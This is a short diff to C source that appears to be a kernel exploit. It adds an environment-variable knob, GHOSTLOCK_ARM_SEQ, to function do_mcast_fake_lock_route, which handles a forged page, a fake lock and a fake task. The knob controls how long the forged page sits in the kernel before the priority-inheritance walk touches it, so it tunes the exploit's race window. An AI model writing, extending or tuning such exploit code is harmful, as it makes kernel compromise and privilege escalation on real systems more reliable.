@@ -275,6 +275,22 @@ void do_mcast_fake_lock_route(void) {
   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
   int route_ok = 0;
 
+  /* Debug knob: how many rounds run before the consumer is armed, i.e. how
+   * long the forged page sits in the kernel before the PI walk touches it.
+   * Shortening it narrows the window in which the page can be recycled. */
+  {
+    const char *a = getenv("GHOSTLOCK_ARM_SEQ");
+    if (a && a[0]) {
+      char *end = NULL;
+      long v = strtol(a, &end, 0);
+      if (end != a && end && !*end && v >= 1 && v <= TCP_ROUTE_ATTEMPTS) {
+        arm_seq = (int)v;
+      } else {
+        pr_warning("invalid GHOSTLOCK_ARM_SEQ=%s, using %d\n", a, arm_seq);
+      }
+    }
+  }
+
   pr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
           "task=%016zx pc=%016zx left=%016zx attempts=%d arm=%d hold=%d\n",
           observe, page_base, fake_lock, fake_task, fake_w0,
